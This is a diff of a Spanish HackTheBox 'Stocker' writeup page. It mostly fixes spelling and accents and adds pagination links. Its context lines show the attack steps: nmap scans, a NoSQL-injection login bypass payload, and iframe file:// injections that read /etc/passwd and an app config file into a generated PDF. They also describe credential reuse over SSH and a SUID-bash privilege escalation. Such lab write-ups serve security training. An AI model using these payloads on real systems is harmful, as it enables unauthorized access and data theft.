@@ -10,7 +10,7 @@
     <meta charset="utf-8">
 
 <!-- begin _includes/seo.html --><title>            Stocker HackTheBox - Blog      Writeups de HTB      </title>
-<meta name="description" content="Buenas a todos, este es mi primer writeup, en esta ocación vamos a resolver una maquina linux llamada stocker de HackTheBox lo cual es está catalogada como easy, espero que disfruten el contenido.">
+<meta name="description" content="Buenas a todos, este es mi primer writeup, en esta ocasión vamos a resolver una máquina linux llamada stocker de HackTheBox la cual está catalogada como easy, espero que disfruten del contenido.">
 
 
 
@@ -21,7 +21,7 @@
 <meta property="og:url" content="http://localhost:4000/writeup-stocker/">
 
 
-  <meta property="og:description" content="Buenas a todos, este es mi primer writeup, en esta ocación vamos a resolver una maquina linux llamada stocker de HackTheBox lo cual es está catalogada como easy, espero que disfruten el contenido.">
+  <meta property="og:description" content="Buenas a todos, este es mi primer writeup, en esta ocasión vamos a resolver una máquina linux llamada stocker de HackTheBox la cual está catalogada como easy, espero que disfruten del contenido.">
 
 
 
@@ -288,7 +288,7 @@
 
   <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
     <meta itemprop="headline" content="Stocker HackTheBox">
-    <meta itemprop="description" content="Buenas a todos, este es mi primer writeup, en esta ocación vamos a resolver una maquina linux llamada stocker de HackTheBox lo cual es está catalogada como easy, espero que disfruten el contenido.">
+    <meta itemprop="description" content="Buenas a todos, este es mi primer writeup, en esta ocasión vamos a resolver una máquina linux llamada stocker de HackTheBox la cual está catalogada como easy, espero que disfruten del contenido.">
     <meta itemprop="datePublished" content="March 12, 2023">
     
 
@@ -309,11 +309,11 @@
           
           
         </p>
-        <p>Buenas a todos, este es mi primer writeup, en esta ocación vamos a resolver una maquina linux llamada stocker de HackTheBox lo cual es está catalogada como easy, espero que disfruten el contenido.</p>
+        <p>Buenas a todos, este es mi primer writeup, en esta ocasión vamos a resolver una máquina linux llamada stocker de HackTheBox la cual está catalogada como easy, espero que disfruten del contenido.</p>
 
 <p><img src="/assets/images/htb-writeup-stocker/Stocker.png" alt="" /></p>
 
-<p>Empezamos a escanear para decubrir puertos abiertos en la maquina</p>
+<p>Empezamos a escanear para descubrir puertos abiertos en la máquina</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-n</span> <span class="nt">-vvv</span> <span class="nt">-Pn</span> 10.10.11.196
 Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
@@ -334,7 +334,7 @@ PORT   STATE SERVICE REASON
 80/tcp open  http    syn-ack ttl 63
 
 </code></pre></div></div>
-<p>Luego seguimos con el escaneo de puertos para ver que versiones y servicios tiene</p>
+<p>Luego seguimos con el escaneo de puertos para ver qué versiones y servicios tiene</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.11.196
 Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-03-12 21:47 <span class="nt">-03</span>
@@ -404,7 +404,7 @@ Progress: 9028 / 220561 <span class="o">(</span>4.09%<span class="o">)</span>^C
 2023/03/12 22:07:20 Finished
 <span class="o">===============================================================</span>
 </code></pre></div></div>
-<p>Podemos ver que nos reporto un directorio llamado fonts, veamos con que nos encontramos</p>
+<p>Podemos ver que nos reportó un directorio llamado fonts, veamos con qué nos encontramos</p>
 
 <p><img src="/assets/images/htb-writeup-stocker/direc.png" alt="" /></p>
 
@@ -436,7 +436,7 @@ Found: dev.stocker.htb <span class="o">(</span>Status: 302<span class="o">)</spa
 
 <p><img src="/assets/images/htb-writeup-stocker/pag.png" alt="" /></p>
 
-<p>Podemos ver que tenemos un login, intente bypasear el login comprobando si es vulnerable a los ataques sqli pero no tuve resultados, despues de muchos intento con 
+<p>Podemos ver que tenemos un login, intenté bypasear el login comprobando si es vulnerable a los ataques sqli pero no tuve resultados, después de muchos intentos con 
 BurpSuite me di cuenta que puedo cambiar las peticiones para causar ataques NoSqli</p>
 
 <p>Al interceptar por BurpSuite nos muestra esto</p>
@@ -471,7 +471,7 @@ Upgrade-Insecure-Requests: 1
 <span class="nv">username</span><span class="o">=</span>admin&amp;password<span class="o">=</span>admin
 </code></pre></div></div>
 
-<p>Ahora para hacer el ataque NoSqli tenemos que ejecutar donde esta el apartado username=admin…. con este script</p>
+<p>Ahora para hacer el ataque NoSqli tenemos que ejecutar donde está el apartado username=admin…. con este script</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"username"</span>: <span class="o">{</span><span class="s2">"</span><span class="nv">$ne</span><span class="s2">"</span>: null<span class="o">}</span>, <span class="s2">"password"</span>: <span class="o">{</span><span class="s2">"</span><span class="nv">$ne</span><span class="s2">"</span>: null<span class="o">}</span> <span class="o">}</span>
 
@@ -480,7 +480,7 @@ Upgrade-Insecure-Requests: 1
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>application/json
 </code></pre></div></div>
-<p>Y nos quedaria algo asi</p>
+<p>Y nos quedaría algo así</p>
 
 <p><img src="/assets/images/htb-writeup-stocker/burp.png" alt="" /></p>
 
@@ -521,30 +521,30 @@ Upgrade-Insecure-Requests: 1
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe <span class="nv">src</span><span class="o">=</span>file:///etc/passwd <span class="nv">height</span><span class="o">=</span>750px <span class="nv">width</span><span class="o">=</span>750px&gt;&lt;/iframe&gt;
 
 </code></pre></div></div>
-<p>Miramos en el repeater que a la derecha luego de ejecutar el codigo nos muestra una id</p>
+<p>Miramos en el repeater que a la derecha luego de ejecutar el código nos muestra una id</p>
 
 <p><img src="/assets/images/htb-writeup-stocker/id.png" alt="" /></p>
 
-<p>Copiamos ese id y lo pegamos donde esta el pdf para que nos muestre el /etc/passwd</p>
+<p>Copiamos ese id y lo pegamos donde está el pdf para que nos muestre el /etc/passwd</p>
 
 <p><img src="/assets/images/htb-writeup-stocker/pdf2.png" alt="" /></p>
 
-<p>Si prestamos atencion al archivo podemos ver que hay un usuario que se llama angoose</p>
+<p>Si prestamos atención al archivo podemos ver que hay un usuario que se llama angoose</p>
 
-<p>Puedo pensas que al tener un subdominio llamado dev tengo entendido que /var/www/dev/index.js sea un archivo de configuración valido</p>
+<p>Puedo pensar que al tener un subdominio llamado dev tengo entendido que /var/www/dev/index.js sea un archivo de configuración válido</p>
 
 <p>Si ejecutamos este script, copiamos el id y lo pegamos donde está el pdf</p>
 
 <pre><code class="language-Bash">"&lt;iframe src=file:///var/www/dev/index.js height=800px width=800px&gt;&lt;/iframe&gt;"
 
 </code></pre>
-<p>Deberiamos ver el index.js en el pdf claramente</p>
+<p>Deberíamos ver el index.js en el pdf claramente</p>
 
 <p><img src="/assets/images/htb-writeup-stocker/burpsuite.png" alt="" /></p>
 
 <p><img src="/assets/images/htb-writeup-stocker/id2.png" alt="" /></p>
 
-<p>Donde marque, podemos ver que el archivo se conecta a mongodb que tiene una contraseña, podemos pobra esa contraseña para poder conectarnos 
+<p>Donde marqué, podemos ver que el archivo se conecta a mongodb que tiene una contraseña, podemos pobrar esa contraseña para poder conectarnos 
 con ssh con el usuario angoose</p>
 
 <p>Nos conectamos por ssh</p>
@@ -605,7 +605,7 @@ angoose@stocker:~<span class="nv">$ </span>
 
 </code></pre></div></div>
 
-<p>Ahora definimos un js para que nos haga una bash suid, cuando lo ejecutemos nos hara un directory path traversal</p>
+<p>Ahora definimos un js para que nos haga una bash suid, cuando lo ejecutemos nos hará un directory path traversal</p>
 
 <h2 id="codigo-js">Codigo js</h2>
 
@@ -697,6 +697,16 @@ bash-5.0#
       
 
       
+  <nav class="pagination">
+    
+      <a href="#" class="pagination--pager disabled">Previous</a>
+    
+    
+      <a href="/writeup-flight/" class="pagination--pager" title="Flight HackTheBox
+">Next</a>
+    
+  </nav>
+
     </div>
 
     
